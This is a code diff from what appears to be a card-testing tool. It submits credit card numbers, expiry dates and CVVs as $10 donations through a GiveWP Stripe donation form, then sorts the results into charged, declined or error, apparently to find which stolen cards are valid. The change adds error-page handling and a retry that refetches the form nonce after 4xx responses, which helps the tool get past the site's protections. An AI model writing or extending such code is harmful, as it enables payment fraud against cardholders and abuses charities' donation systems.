@@ -923,7 +923,11 @@ def sc_classify_donation_response(status_code, resp_text, final_url=""):
     if "donation-confirmation" in final_url.lower() or "success" in final_url.lower():
         return "CHARGE", "Donation successful", "Donation successful", f"${SC_DONATE_AMOUNT}", "Stripe Charge $10"
     
-    return "DECLINED", plain_text[:150] if plain_text else "Unknown", plain_text[:150] if plain_text else "Unknown", f"${SC_DONATE_AMOUNT}", "Stripe Charge $10"
+    # Step 5: Handle HTTP error pages
+    if status_code >= 400:
+        return "ERROR", f"Site error {status_code}", f"Site error {status_code}", "N/A", "Stripe Charge $10"
+    
+    return "DECLINED", plain_text[:150] if plain_text else "Unknown response", plain_text[:150] if plain_text else "Unknown response", f"${SC_DONATE_AMOUNT}", "Stripe Charge $10"
 
 def check_stripe_charge(cc, month, year, cvv, session=None, form_hash=None):
     """Check card via GiveWP Stripe Charge $10 gateway"""
@@ -994,6 +998,11 @@ def check_stripe_charge(cc, month, year, cvv, session=None, form_hash=None):
         
         don_status, don_resp, final_url = sc_submit_donation(session, pm_id, form_hash, name, email, addr)
         elapsed = round(time.time() - start_time, 2)
+        
+        if don_status >= 400 and don_status < 500:
+            form_hash = sc_fetch_form_nonce(session)
+            don_status, don_resp, final_url = sc_submit_donation(session, pm_id, form_hash, name, email, addr)
+            elapsed = round(time.time() - start_time, 2)
         
         category, status_msg, response_msg, price, gateway = sc_classify_donation_response(don_status, don_resp, final_url)
         return category, status_msg, response_msg, price, gateway, elapsed
